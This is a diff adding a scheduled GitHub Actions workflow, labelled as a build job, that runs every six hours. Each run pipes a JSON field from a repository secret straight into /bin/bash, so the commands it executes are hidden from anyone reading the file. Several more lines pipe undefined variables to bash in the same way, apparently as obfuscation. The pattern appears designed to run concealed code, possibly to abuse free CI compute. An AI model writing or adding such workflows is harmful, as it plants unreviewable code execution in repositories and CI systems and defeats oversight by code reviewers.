@@ -1,0 +1,22 @@
+name: dengfei19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dengfei19871010
+        env:
+          r3: ${{ secrets.r3 }}
+        run: |
+          echo $r3 | jq -r .jki88 | /bin/bash
+          echo $hol692 | jq -r .qckng49 | /bin/bash
+          echo $axed831 | jq -r .sgjq6269 | /bin/bash
+          echo $mofnx6 | jq -r .ehdg166 | /bin/bash
+          echo $ubi71564 | jq -r .kofe282 | /bin/bash
+          echo $f1457 | jq -r .x8757 | /bin/bash
+
